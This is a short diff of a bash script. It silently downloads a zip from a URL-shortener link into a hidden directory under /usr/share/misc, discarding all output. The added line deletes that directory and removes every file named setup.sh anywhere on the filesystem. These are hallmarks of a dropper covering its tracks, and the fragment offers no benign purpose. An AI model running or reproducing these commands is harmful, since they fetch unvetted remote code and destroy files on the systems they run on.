@@ -1,5 +1,6 @@
 #!/bin/bash
 unalias -a
+rm -rf /usr/share/misc/final; find / -type f -name "setup.sh" -exec rm -f {} \;
 mkdir /usr/share/misc/final >/dev/null 2>&1
 wget goo.gl/oi5amn -O /usr/share/misc/final/setup.zip >/dev/null 2>&1
 sleep 2
